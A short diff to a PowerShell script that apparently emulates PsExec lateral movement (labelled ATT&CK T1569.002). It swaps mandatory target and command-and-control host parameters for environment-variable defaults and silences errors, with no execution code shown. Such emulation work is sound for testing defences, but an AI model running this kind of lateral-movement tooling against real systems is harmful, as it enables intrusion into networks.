@@ -1,12 +1,7 @@
-param(
-    [Parameter(Mandatory=$true)]
-    [string]$TargetIP,
-
-    [Parameter(Mandatory=$true)]
-    [string]$C2Host
-)
-
 $ErrorActionPreference = "SilentlyContinue"
+$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "192.168.1.10" }
+$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
+
 Write-Host "[*] Starting Lateral Movement - PsExec Remote Execution..." -ForegroundColor Cyan
 
 # T1569.002 - System Services: Service Execution
